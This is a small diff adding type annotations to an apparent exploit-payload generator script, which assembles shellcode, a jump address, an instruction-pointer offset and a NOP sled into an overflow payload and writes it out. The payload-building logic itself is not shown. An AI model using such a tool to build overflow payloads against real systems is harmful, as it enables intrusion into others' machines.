@@ -92,14 +92,14 @@ def main() -> NoReturn:
         sys.exit(4)
     #Get NOP LEN:
     try:
-        nop_len = int(opts.nop_len, base=0);
+        nop_len:int = int(opts.nop_len, base=0);
     except Exception as err:
         print("{0} is invalid nop length!:\n\t\t\t\t\t{1}".format(opts.nop_len,err))
         sys.exit(5);
     payload = build_payload(shellcode,jmp_addr,ip_offset,nop_len,arch=opts.arch)
     
-    outmodes = { False: 'wb', True: 'w'}
-    encodings= { False: lambda a : a , True: bytes_to_ascii}
+    outmodes:Dict[bool,str] = { False: 'wb', True: 'w'}
+    encodings:Dict[bool,Callable[bytes,any]] = { False: lambda a : a , True: bytes_to_ascii}
     try:
         if(opts.outfile != '-'):
             with open(opts.outfile, outmodes[opts.ascii_out]) as outfp:
